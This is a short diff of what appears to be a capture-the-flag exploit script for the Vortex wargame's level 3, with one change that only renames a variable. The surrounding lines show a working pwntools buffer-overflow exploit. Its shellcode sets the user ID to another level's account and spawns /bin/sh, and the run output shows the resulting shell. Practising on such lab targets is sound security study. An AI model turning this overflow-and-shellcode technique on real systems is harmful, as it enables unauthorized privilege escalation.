@@ -301,7 +301,7 @@ BINARY = "/vortex/vortex3"
 
 LEVEL4_UID = 5004       # <-- UID corretto del livello 4
 OFFSET = 132
-LPP = 0x08049052
+lpp = 0x08049052
 
 shellcode = asm("""
     xor eax, eax
@@ -337,11 +337,11 @@ assert b"\x00" not in shellcode
 payload = (
     shellcode +
     b"A" * (OFFSET - len(shellcode)) +
-    p32(LPP)
+    p32(lpp)
 )
 
 log.info(f"payload length: {len(payload)}")
-log.info(f"LPP: {hex(LPP)}")
+log.info(f"lpp: {hex(lpp)}")
 
 io = process([BINARY, payload])
 io.interactive()
@@ -350,7 +350,7 @@ vortex3@vortex:~$ python3 /tmp/bz.py
 [*] shellcode length: 43
 [*] shellcode: 31c0b04631db66bb8c1331c966b98c13cd8031c0b00b31d252682f2f7368682f62696e89e3525389e1cd80
 [*] payload length: 136
-[*] LPP: 0x8049052
+[*] lpp: 0x8049052
 [+] Starting local process '/vortex/vortex3': pid 111
 [*] Switching to interactive mode
 $ id
